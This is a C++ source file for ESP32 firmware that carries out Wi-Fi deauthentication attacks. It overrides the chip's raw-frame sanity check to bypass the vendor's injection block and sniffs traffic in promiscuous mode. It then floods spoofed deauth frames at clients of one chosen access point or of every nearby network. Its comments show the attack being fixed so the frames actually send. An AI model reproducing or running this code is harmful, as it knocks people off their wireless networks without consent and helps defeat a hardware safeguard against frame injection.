// deauth.cpp
#include <WiFi.h>
#include <esp_wifi.h>

// Needed from main.cpp
extern int pending_ch;
extern uint8_t target_bssid[6]; // IMPORTED explicitly so the reactive loop actually fires

// ================= CONFIG =================
#define AP_NAME        "ESP32_Tactical"
#define AP_PASS        "mgmtadmin"

#define DEAUTH_SINGLE  0
#define DEAUTH_ALL     1

#define BURST_COUNT    16

// ================= FRAME STRUCT =================
typedef struct {
  uint8_t fc[2] = {0xC0, 0x00};
  uint8_t dur[2] = {0x3A, 0x01};
  uint8_t target[6];
  uint8_t transmitter[6];
  uint8_t ap[6];
  uint8_t seq[2] = {0x00, 0x00};
  uint16_t reason;
} deauth_pkt_t;

typedef struct {
  uint16_t fc;
  uint16_t dur;
  uint8_t dst[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t seq;
  uint8_t addr4[6];
} wifi_hdr_t;

typedef struct {
  wifi_hdr_t hdr;
  uint8_t payload[0];
} wifi_frame_t;

// ================= GLOBAL STATE =================
static deauth_pkt_t pkt;
static int attack_mode = DEAUTH_SINGLE;
static int kicked_count = 0;

// ================= HELPERS =================
inline bool same_mac(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

inline bool not_broadcast(const uint8_t *mac) {
  static const uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
  return memcmp(mac, broadcast, 6) != 0;
}

// ================= BYPASS =================
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
  return 0;
}
esp_err_t esp_wifi_80211_tx(wifi_interface_t, const void *, int, bool);

// ================= SNIFFER CALLBACK =================
IRAM_ATTR void packet_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  
  const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
  const wifi_frame_t *frame = (wifi_frame_t *)raw->payload;
  const wifi_hdr_t *hdr = &frame->hdr;
  
  if (raw->rx_ctrl.sig_len < sizeof(wifi_hdr_t)) return;

  // Keep seq changing a little so frames are not all identical
  pkt.seq[0]++;
  if (pkt.seq[0] == 0) pkt.seq[1]++;

  if (attack_mode == DEAUTH_SINGLE) {
    // Only target traffic related to chosen AP
    if (!same_mac(hdr->dst, pkt.transmitter) && !same_mac(hdr->src, pkt.transmitter)) {
      return;
    }

    // Client MAC
    if (same_mac(hdr->src, pkt.transmitter))
      memcpy(pkt.target, hdr->dst, 6);
    else
      memcpy(pkt.target, hdr->src, 6);

    if (!not_broadcast(pkt.target)) return;

    for (int i = 0; i < BURST_COUNT; i++) {
      // RESTORED: Transmit on WIFI_IF_AP so packets actually send
      esp_wifi_80211_tx(WIFI_IF_AP, &pkt, sizeof(pkt), false);
      delayMicroseconds(250);
    }
    kicked_count++;
  }
  else {
    bool valid = same_mac(hdr->dst, hdr->bssid) && not_broadcast(hdr->src);
    if (!valid) return;

    memcpy(pkt.target, hdr->src, 6);
    memcpy(pkt.ap, hdr->dst, 6);
    memcpy(pkt.transmitter, hdr->dst, 6);

    for (int i = 0; i < BURST_COUNT; i++) {
      // RESTORED: Transmit on WIFI_IF_AP so packets actually send
      esp_wifi_80211_tx(WIFI_IF_AP, &pkt, sizeof(pkt), false);
      delayMicroseconds(250);
    }
  }
}

// ================= START ATTACK =================
void begin_attack(int net_index, int mode, uint16_t reason_code) {
  kicked_count = 0;
  attack_mode = mode;
  pkt.reason = reason_code;

  esp_wifi_set_channel(pending_ch, WIFI_SECOND_CHAN_NONE);

  if (attack_mode == DEAUTH_SINGLE) {
    // FIXED: Because WiFi.scanDelete() is used in main.cpp, pulling BSSID by index returns garbage here.
    // We now use the global target_bssid pulled straight from the UI request.
    memcpy(pkt.ap, target_bssid, 6);
    memcpy(pkt.transmitter, target_bssid, 6);
  }

  wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
  };

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&packet_handler);
  esp_wifi_set_promiscuous(true);
}

// ================= STOP ATTACK =================
void end_attack() {
  Serial.println("Stopping attack...");
  
  // Stop sniffing traffic to clear the queue
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  
  // RETAINED: Left WiFi.softAPdisconnect OUT to make sure you never drop connection on STOP.
}